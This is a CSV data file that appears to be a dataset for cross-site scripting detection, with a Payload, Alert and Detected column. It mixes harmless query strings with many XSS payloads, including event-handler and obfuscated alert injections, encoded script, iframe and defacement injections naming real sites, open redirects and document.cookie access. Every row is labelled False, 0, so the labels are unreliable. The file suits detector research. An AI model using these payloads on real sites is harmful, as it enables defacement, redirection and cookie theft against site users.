Payload,Alert,Detected
"<div style=""font-family:'foo&#10;;color:red;';"">LOL",False,0
cid=27&id=69,False,0
"<style>:target {color: red;}</style><iframe2 id=x style=""transition:color 10s"" ontransitioncancel=print()></iframe2>",False,0
id=70&typ=i&brand=New%20products&L=1&spr=EN&nutzerkennung=7697<br/>420817844&suchen=innerhalb,False,0
s=search_results,False,0
"<style>:target {color: red;}</style><address id=x style=""transition:color 10s"" ontransitioncancel=print()></address>",False,0
fuseaction=mExternal.jobseekerEMSLogin,False,0
lang=fr-iso-8859-1&server=1&pma_username=%22%3E%3Cmarque<br/>e%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h1%3E%3C/marquee%3E,False,0
onbeforeinput,False,0
x-redirect=http://www.xssed.com,False,0
<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click,False,0
ru=/support/securitycenter/beta<br/>/betapage.php,False,0
section=productinfo,False,0
sayfa=(0wnZ%20y0ur%20b0x%20DesquneR,False,0
ac=bbs&cd=121&team=B&BBSTABLE=04t&bbscd=blowjob,False,0
login=%22%3E%3Ciframe%20src=%22http://brenn0.wordpr<br/>ess.com%22%3E,False,0
&search=%3Cfont%20size=7%3EDaiMon%20Was%20heRe,False,0
"<div id=""96""><iframe src=mhtml:http://html5sec.org/AnonKryptiQuz.html!xss.html></iframe>",False,0
window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1),False,0
fn=jtb&sfn=result&idc=27&idp=99&advs=0&jtb_smallbid=&phrase=%22%3E%3Cscr<br/>ipt+src%3Dhttp%3A%2F%2Fzucker.schokokeks.org%2F%7Elars%2Fi.js%3E&smode=and&period=0&sregio=&submit=S<br/>uchen,False,0
oncontextmenu,False,0
"<style>:target {color: red;}</style><p id=x style=""transition:color 10s"" ontransitioncancel=print()></p>",False,0
bannerid=388&zoneid=41&source=&dest=http://seymen.org,False,0
realFilePath=%22%3E%3Ciframe/src=127.0.0.1l%3E%3C/iframe%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><embed id=x style=""transition:transform 2s"" ontransitionrun=print()></embed>",False,0
controller=contact,False,0
"<style>:target {transform: rotate(180deg);}</style><template id=x style=""transition:transform 2s"" ontransitionrun=print()></template>",False,0
"fuseaction=classifieds.searchCategory&keyWord=""><h1>MySpace%20X<br/>SS</h1><A%20HREF=""http://www.xssed.com/"">XSS%20(Fake%20myspace.com%20login%20page)<br><img%20src=""ht<br/>tp://img62.imageshack.us/img62/4615/stallowned3hb.jpg""></A><br><input%20type=""text""%20value=""Hexspir<br/>it""%20/><br><marquee>ROTFL!%20LMAO!%20OMG!</marquee>",False,0
ci=10530&spkey=GDSWNET-P3PWCORPWEB137&redirect=true&target=http:/<br/>/www.xssed.com,False,0
detail=<center><h1>XSSED by SPYRO KiD<br><a<br/>href=http://spyrozone.net>http://spyrozone.net</a></h1><br><iframe width=800 height=600<br/>src=http://spyrozone.net></iframe>,False,0
id='%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
sname=<font size=7<br/>color=red><blink>LeBaNeSe-XsSeR</blink></font>&state=ALL&ref=&se=&doby=&city=&name_style=1&tm=&tmr=,False,0
h=0&w=&User=%22%3E%3Ciframe%20src=http://google.com%3E,False,0
administer_redirect_1=http://vuln.x<br/>ssed.net/thirdparty/scripts/python5.html?utm_campaign=70150000000OzH4&utm_source=Online&utm_medium=k<br/>rebsbank,False,0
kw=%22%3E%3Ciframe%20src=/%3E%3C/iframe%3E,False,0
prenom=%22%3E%3Cl<br/>ink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3E,False,0
query=%3Ciframe%20src=http://jersain.iespana.es/xss.<br/>html%20%3C,False,0
option=com_content&user_rating=1&submit_vote=index2.php?<br/>option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=<br/>http://yea.by.ru/x.htm,False,0
action=voir&quoi=redirection&url=http://xssed.com,False,0
name='%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueballr%3C/strong<br/>%3E%3C/h1%3E%3C/marquee%3E,False,0
locale=es_US&searchString=%20&p=/utility/siteMap/siteMap.jsp&p=/<br/>utility/siteMap/siteMap.jsp&toggleSubmitButton=%22><iframe%20src%3D%22http://google.com,False,0
option=com_content&user_rating=1&submit_vote=index2.php?<br/>option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=<br/>http://xssed.com,False,0
"<style>:target {transform: rotate(180deg);}</style><keygen id=x style=""transition:transform 2s"" ontransitionrun=print()></keygen>",False,0
page=companies&id=1446&name=%22%3E%3Ciframe%20src=h<br/>ttp://imhatimi.org/%3E,False,0
onclose,False,0
stage1,False,0
id=39,False,0
year=</title><iframe width=900 height=800 src=http://www.google.ma>,False,0
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%3C<br/>h1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
include=http://xssed.com/mirror/45426/,False,0
onfocusin,False,0
url=www.bing.com,False,0
url=http://uber0n.darkillusion.org/xsspage.ht<br/>m,False,0
"errormessage=';//\';//""//\""//--></SCRIPT>"">'><IFRAME<br/>SRC=http://xss.exofire.net/x/ WIDTH=1024 HEIGHT=860>",False,0
"<style>:target {transform: rotate(180deg);}</style><command id=x style=""transition:transform 2s"" ontransitionrun=print()></command>",False,0
"<style>:target {transform: rotate(180deg);}</style><table id=x style=""transition:transform 2s"" ontransitionrun=print()></table>",False,0
"kategori=<iframe%20src=""http://www.xssed.com/archive/aut<br/>hor=TurKPoweR/"">",False,0
option=com_content&user_rating=1&submit_vote=index<br/>2.php?option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=<br/>1&url=http://www.xssed.com,False,0
pt=2&sp=2&vid=1196423233_1X02X1650708857&<br/>rpt=3&kt=1,False,0
q=%3Ciframe%20src=%22http://droptix.itrello.com/xss.php%22%20width=<br/>%22800%22%20height=%22310%22%3E&ref=2077,False,0
reactie=1&film_ID=3306,False,0
"<style><img src=""</style><img src=x ""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",False,0
"'';!--""<XSS>=&{()}",False,0
"<IMG SRC='vbscript:msgbox("""")'>",False,0
body=/home/pesquisa.jsp,False,0
onFocusOut,False,0
url=www.geocities.com/pinkelephant2k7/owned.html&adid=24&time=<br/>30,False,0
Category=&All=1,False,0
http://xssed.com/archive/author=ironzorg/,False,0
pais=222=%22%3E%3Ciframe%20src=http://www.google.com/%20width<br/>=866%20height=450%3E%3C/iframe%3E,False,0
onafterprint,False,0
id=215&url=http://log0.wordpress.com,False,0
search=%22%3E%3Ch1%3EHacked+By+Dialogitec+ImeCiQ%3C%2Fh1<br/>%3E%3C%21--,False,0
pg=ss_istatistik_menu&url=http://xssed.com,False,0
"""/><body onpageshow-prompt`assassin`//",False,0
s=98a233fa3a524da65ffff02410510f09,False,0
"mode=""><img<br/>src=""http://img61.imageshack.us/img61/4632/26vrul2.jpg"">",False,0
email=%22%3E%3Ch1%3EBy%20Kusomiso.com%3C/h1%3E&name=%22%3E<br/>%3Ch1%3EBy%20Kusomiso.com%3C/h1%3E,False,0
submit&show_form=wap_login_problems&cant_identify=1&refid=0,False,0
keyword=%22%3E%3Ciframe%20src=http://googlebig.com<br/>%20height=%22600%22%20width=%22800%22%3Eaaaaa&game=12&search_category=all&fields_name=1&fields_filen<br/>ame=1&sort=name&order_in=asc&limit=25&outdated_in=0&descriptions_in=0&summary_in=0&show_screenshot_i<br/>n=0,False,0
t=%22%3E%3Cimg+src%3Dhttp%3A%2F%2Fwww.scriptkiddie.us%2F1.jp<br/>g%3E&a=&s=&d=&p=1&r=tarih,False,0
"<style>:target {transform: rotate(180deg);}</style><input4 id=x style=""transition:transform 2s"" ontransitionrun=print()></input4>",False,0
type=goto&page=uber0n.darkillusion.org/xsspage.htm&pos<br/>=HPmodule-JM&sn2=a8a854b8/c9fa3992&sn1=907f5673/69339c48&camp=hpmodJM-house-cla2&ad=HpMo-JM-DealBook<br/>-gif&goto=http://uber0n.darkillusion.org/xsspage.htm,False,0
"addr='""><iframe/src=http://xssed.com>",False,0
aktion=sokres,False,0
q=%3Ch1%3EHacked%20By%20Dialogitec%20ImeCiQ%3C/h1%3E,False,0
lid=16&tid=0&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20Code%20S<br/>ervices%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
iphone&next=http%3A%2F%2Fiphone.facebook.com%2F,False,0
AffiliateID=1&BannerID=CS_Premium&DestURL=http<br/>://xssed.com,False,0
Tur=<marquee><h1>XSS</h1></marquee>,False,0
term=%3C/script%3E%3Cimg+src%3D%22http%3A%2F<br/>%2Fantiquescoffee.files.wordpress.com%2F2009%2F11%2Fshame-on-you.jpg%22%2F%3E%3C!--,False,0
dd=0&query=jhumpa%2F%3Ciframe%20src=http://xssed.com%3E%3C/ifram<br/>e%3E,False,0
a=http://www.owasp.org/index.php/Open_redirect,False,0
from=hottie_email_38&to=http://r3t.n3t.nl/youreahottie/user/intersti<br/>cial&fbid=596705598,False,0
"<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[""'`-->]]>]</div>",False,0
id=%22%3E%3Ciframe%20src=http://pc-kopat.us/hacked/%3E,False,0
page=lid&lid=heykid,False,0
"query=""\>hadopi<iframe<br/>src=""http://hackadaycom.files.wordpress.com/2009/07/wtf-button.jpg""",False,0
nom=%22%2F%3E%3Ciframe+s<br/>rc%3D%22http%3A%2F%2Fxssed.com%22%3E&Rech_excl=non&affiche=complete&type_form=0&chercher=Chercher&ch<br/>erchersubmit=Chercher,False,0
key=cerita%20sex%20.../i...lci.biz//include/write.php?dir=http//su<br/>nburnultimate.com/safe1.txt???&max=%3Ciframe%20src=,False,0
"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=print()></applet>",False,0
onOnline,False,0
"RC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""",False,0
cmd=search&words=%3Cmarquee%3EXSSED_bY_SaMTH<br/>G%3C/marquee%3E&searchWhere=0&mode=normal,False,0
lid=%3Ciframe%20src=http://www.google.com%3E%3C/iframe%3E,False,0
option=com_content&user_rating=1&submit_vote=index2.php?optio<br/>n=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http:<br/>//www.xssed.com,False,0
KID=111020&showresult=1%22%3E%3Cdiv<br/>%20style=z-index:1000;width:2000px;height:2000px;background:black;color:lime;position:absolute;top:0<br/>;padding:100px;left:0px;font-size:50px%3EXSS%20by%20nevillon%20-%20devilteam%20quad%3C/div%3E%3Cfont<br/>%20alt=%22&formular=4&CREF2=368&detail=zielgebiet&termin=26.01.2009&ruecktermin=25.04.2009&erwachsen<br/>e=25%3B25&marke=,False,0
option=com_content&user_rating=1&submit_vote=index2.php?op<br/>tion=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=ht<br/>tp://xssed.com/,False,0
setInterval('ale'+'rt(10)');,False,0
path=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h1%3E%3C/marq<br/>uee%3E,False,0
id=7%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
nats=%22%3E%3Ciframe%20src=http://hypnozhack.org/hacked/%3E,False,0
action=missionary.register,False,0
bannerid=33&zoneid=1&source=header&dest=http%3A%2F%2Fwww.xssed.com,False,0
mod=decrypt,False,0
&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;,False,0
tid=30093,False,0
<svg/onload=location=‘javas’%2B‘cript:’%2B,False,0
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1),False,0
"s=<iframe src=""http://xssed.com""></iframe>",False,0
pid=58&la=1,False,0
"&article_id=1203&article_type=''""""/><img>",False,0
"bandeau=/energie/politiqu/be_polit.htm""><<br/>frame name=droite src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.html>",False,0
ref=VACC_ppc-moteur&url=http://pub.partirpascher.com/RealMedia/ads/click_lx.ads/<br/>voila/homepage/blocmoteur/1123456789/Top/voila_bloc_moteur/voila_image_bloc_moteur/124?http://antici<br/>pate.free.fr,False,0
soegefelt=%27%3E%3E%3Cmarquee%3E%3Ch1%3ESECURITY+BY+Cherokee+Warr<br/>ier%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
ondragleave,False,0
scr=1024&id=348,False,0
ViewItem&rt=nc&item=181023275832&si=gGZ3pf0PeJXSxz0i4IMd7G4<br/>Xu2Q%3D&print=all&category=172602,False,0
query=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3E%3C<br/>i%3Ecueballr%3C%2Fi%3E%3C%2Fstrong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
QUERY=%22%27%3E%3Cmarquee%3E%3Ch1%3Ecueballr%3C%2Fh1%3E%3C%2Fm<br/>arquee%3E&STYPE=OR,False,0
REF=1'><iframe%20src=http://google.com>,False,0
"”&amp;gt;&amp;lt;svg onload=alert&amp;amp;#0000000040""1"")&amp;gt;",False,0
&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;,False,0
url=http%3A%2F%2Fr3t%2En3t%2Enl&frame=false,False,0
e=%3Ciframe+src%3dhttp%3a%2f%2fwww.google.com+%2f%3E,False,0
file=//google.fr,False,0
mod=files&action=listcat&start=0&where=20&sort=6,False,0
type_id=1'%3E%22%3E%3Ciframe%20src=http://kusomiso.com/x<br/>ss.html%20%3C,False,0
cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][<br/>][][][][][][]=%3Cscript%20src=http://hiphopshare.xm.com/xss.js,False,0
zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//,False,0
<img SRC='vbscript:document.vulnerable=true;'>,False,0
a=fpswd,False,0
m=Register&a=Registration,False,0
ac=login,False,0
page=menu_ypg&url=http://www.geocities.com/pinkelephan<br/>t2k7/owned.html,False,0
q=%22/%3E+%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
x:expression8write(1)9>,False,0
"<style>:target {transform: rotate(180deg);}</style><rp id=x style=""transition:transform 2s"" ontransitionrun=print()></rp>",False,0
docId=2015493866&userId=613802&agentId=483135&t<br/>ype=2&s=155732&url=http://www.xssed.com,False,0
';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//,False,0
?><img src=x onmouseleave=print()>,False,0
ID=76421,False,0
pag=%3Ccenter%3E%3Cfont%20size=18%3EHo<br/>tpockets%20was%20here%3C/size%3E%3C/center%3E,False,0
e=invalid_url&return=http://4.hidemyass.com/browse.php%3Fu%3DOi8vPi<br/>I8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4%3D%26f%3Dnorefer%26idx%3D2&p=YToxOntpOjA7czo0O<br/>DoiaHR0cDovLz4iPHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+Ijt9,False,0
option=com_content&user_rating=1&submit_vote=index2.php?opt<br/>ion=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=htt<br/>p://www.xssed.com,False,0
rid=691&cuser=&url=http://xssed.com,False,0
subject=server&server=test,False,0
site=as&name=aaa%27%22%3E%3Ciframe%20src=http://xs<br/>sed.com%3E&email=a%40a.com&confirm_email=a%40a.com&ST=1&username=aaaazazv&password=vvvvsdds&Submit.x<br/>=65&Submit.y=12&Submit=Submit+Order,False,0
"people_id=173""/><iframe<br/>src=""http://xssed.com"">",False,0
newUser=1&zsrc=10,False,0
ab='%22%3E%3Ciframe%20src=http://pc-kopat.us/hacked/%3E,False,0
chid=2305&send=1&lang=de&s<br/>id=2d4a0c9bcab05a616dc7ffc3e6c4105f&m=3,False,0
"anterior=1&buscando=1&q=""><iframe<br/>src=http://xssed.com>&buscar=Buscar&lr=lang_es",False,0
url=http%3A//www.owasp.org/index.php/Open_redirect,False,0
entree=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL%3C%2Fmarqu<br/>ee%3E,False,0
url=http://img164.imageshack.us/img164/9097/systemcr<br/>ash2.jpg,False,0
"&lt;A HREF=\""http&#58;//ha&#46;ckers&#46;org@google\""&gt;AnonKryptiQuz&lt;/A&gt;",False,0
lid=dk&tid=hungi.mozilla&f_user=&six=&f_email==%22%3E%3Ch1%3E<br/>Null%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
&#x00003c,False,0
doSearch=true&bt_ok.x=0&bt_ok.y=0&qword=<iframe<br/>src=http://xssed.com></iframe>,False,0
open=general/search.php&lang=dutch&style=,False,0
rid=file:%0AContent-Type:%20text/html;charset=UTF-7%0A%0A%2BADw-script%2BAD4-a<br/>lert(%27XSS%27);%2BADw-/script%2BAD4-,False,0
s=http://www.nullflow.com/xss/xss.php,False,0
option=com_content&user_rating=1&submit_vote=index2.<br/>php?option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&<br/>url=%68%74%74%70%3a%2f%2f%77%77%77%2e%67%6f%6f%67%6c%65%62%69%67%2e%63%6f%6d,False,0
lang='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3C<br/>marquee%3EWhiteHat%20Forever%3C/marquee%3E,False,0
"<div id=""95""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",False,0
rid=file:%0AContent-Type:%20text/html;charset=UTF-7%0A%0A%2BADw-script%2BAD4-ale<br/>rt(%27XSS%27);%2BADw-/script%2BAD4-,False,0
imgurl=http://www.quadconversions.com/cars_for_sale/images/106_4_s<br/>ale.jpg&imgrefurl=http://xssed.com&h=419&w=560&sz=55&hl=en&start=1&tbnid=HKEGJpGbYDzoIM:&tbnh=100&tb<br/>nw=133&prev=//xssed.com,False,0
partnerId<br/>=clix&adtype=searchtab&adrecip=clix,False,0
"<layer src=""http://vulnerability-lab.com/script.html""></layer>",False,0
r=1&url=http://st2tea.blogspot.com,False,0
"<style>:target {transform: rotate(180deg);}</style><time id=x style=""transition:transform 2s"" ontransitionrun=print()></time>",False,0
id=mfth&url=http://starext.by.ru/s.html,False,0
volltext=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fxssed.com%3E,False,0
AK=090,False,0
lang=gr,False,0
onpagehide,False,0
option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&tas<br/>k=vote&pop=0&Itemid=10&cid=1&url=http://milw0rm.com,False,0
search=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><sub id=x style=""transition:transform 2s"" ontransitionrun=print()></sub>",False,0
url=http://c0ncenTraTe.by.ru/Cyber-Raider,False,0
"<html xmlns=""http://www.w3.org/1999/xhtml"">",False,0
</Title/</Style/</Script/</textArea/</iFrame/</noScript>,False,0
islem=ara,False,0
"&lt;AnonKryptiQuz STYLE=\""behavior&#58; url(xss&#46;htc);\""&gt;",False,0
"SES=';//\';//""//\""//--></SCRIPT>"">'><IF<br/>RAME SRC=http://xss.exofire.net/x/ WIDTH=1024 HEIGHT=860>",False,0
method=%22%3E%3Ciframe%20src=./%3E%3C/iframe%3E,False,0
"<div style=""background-image:52c8'a161332904a1c5248.10278.1053379'9"">",False,0
<svg/onload​=alert/&#42;&#42;/(4)>,False,0
<d3v/onauxclick=(((confirm)))``>click,False,0
onpointermove,False,0
id=24&url=http://www.xssed.com,False,0
path=http://xssed.com,False,0
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">",False,0
00:00:00.000 --> 00:00:05.000,False,0
URL=http://www.geocities.com/pinkelephant2k7/owned.html&Conten<br/>t=Organization&ID=ADPC&lang=en&Frame=yes&NationCode=764,False,0
ID=%3Cb%3E%3Ch1%3EBy%2003storic%3C/h1%3E%3C/b%3E%3Cimg%20src=ht<br/>tp://data.xssed.org/images/xssed_logo.gif%3E,False,0
ResetPassword,False,0
"nextPage=http://www.xssed.com"" foo=""bar",False,0
&#x003C;,False,0
pollId=qe5zen49gsgyzk3h&adminKey=&participantKey=&dcs_checkboxBook=0<br/>&5=0&4=0&3=0&2=0&1=0&0=0,False,0
s=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fxssed.com%3E,False,0
q='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarquee%3EWhi<br/>teHat%20Forever%3C/marque%3E&qh='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarquee%3EWhite<br/>Hat%20Forever%3C/marque%3E,False,0
criteria=%3Ciframe<br/>%20src=%22http://xssed.com%22%3E,False,0
"LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>",False,0
http://r3t.n3t.nl,False,0
search=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3E%3Ci%3Ecueballr%3C%2Fi<br/>%3E%3C%2Fstrong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
"window['alXert'.replace(/X/, '')](self['document']['cookie'])",False,0
"cof=FORID%3A10&cx=018072894833368049022%3Alj4hepffnaa&q=http://media2.pl/sz<br/>ukaj/?cof=FORID%3A10&cx=018072894833768049022%3Alj4hepffnaa&q=<iframe src=""http://xssed.com"">",False,0
option=com_content&user_rating=1&submit_vote=index2.php?optio<br/>n=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http:<br/>//xssed.com,False,0
s=%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E%3Cimg%20src=%22,False,0
option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1<br/>&task=vote&pop=0&Itemid=10&cid=1&url=%0AContent-Type:%16text/html%0AContent-Length:13%0A%0Ayou%20are<br/>%20xssed%20,False,0
s=%3Ciframe%20src=http://byulkucu.sitemynet.com%20style=pos<br/>ition:absolute;left:0;top:0;width:1500px;height:5000px%3E%3Ciframe%20src=http://xssed.com%3E&submit=<br/>Ara,False,0
login=&foto=1744&chica=%22%3E%3Ciframe%20src=http://hypno<br/>zhack.org/hacked/%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><option id=x style=""transition:transform 2s"" ontransitionrun=print()></option>",False,0
message=<h1>Hacked%20By%20T<br/>reX</h1>,False,0
id=129946463714673,False,0
bannerid=1&zoneid=1&source=&dest=http://www.reelix.za.net<br/>/alert.html,False,0
"$(""span.foo"").click(function() {",False,0
nom=%22%3E%3Cma<br/>rquee%3E%3Ch1%3Estarext%3C/h1%3E%3C/marquee%3E,False,0
t=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
sx=true,False,0
"<xhzeem attr="" --- x=""=='='onmouseover=confirm`xhzeem` style=""display:block;width:1000px;height:1000px;background:red""> --- "">",False,0
RequestTimeout=24000,False,0
"<x 1="">"" onxxx=1",False,0
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>,False,0
op=rubroa&eng=%22%3E%3Ch1%3EA%20lot%20of%20XSSes!%3C/h1%3E,False,0
tid=14,False,0
apellido=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fxssed.com%3E&p<br/>os=&nombre=,False,0
site=http://uber0n.darkillusion.org/xsspage.htm,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=c<br/>om_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://w<br/>ww.xssed.com,False,0
criterio=%22%3E%3Cdiv%20align=center%3E%3Cfont%20color=red%20size<br/>=16pt%3EH4xor3d%20!!!%3C/font%3E%3C/div%3E,False,0
keyword=%3Ciframe%20src=http://www.google.com%3E%3C/iframe%3E,False,0
onwheel,False,0
"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",False,0
"<!ATTLIST img xmlns CDATA ""http://www.w3.org/1999/xhtml"" src CDATA ""xx:x""",False,0
c=d1&searchview=d1&changequery=1&template=%2Fsearch.html&q=%22%3E%3C<br/>iframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E&x=0&y=0,False,0
lnkct<br/>r=srchrd-sr%22%3E%3Casdf&personid=30041737&strackid=4645f5438bfa61ee_0_srl&strkid=1363956044_0_0,False,0
s=<iframe src=http://xssed.com>,False,0
.html,False,0
&#X3C,False,0
link=7&client=75&url=http://r3t.n3t.nl,False,0
</feImage>,False,0
xssed.com?frm=,False,0
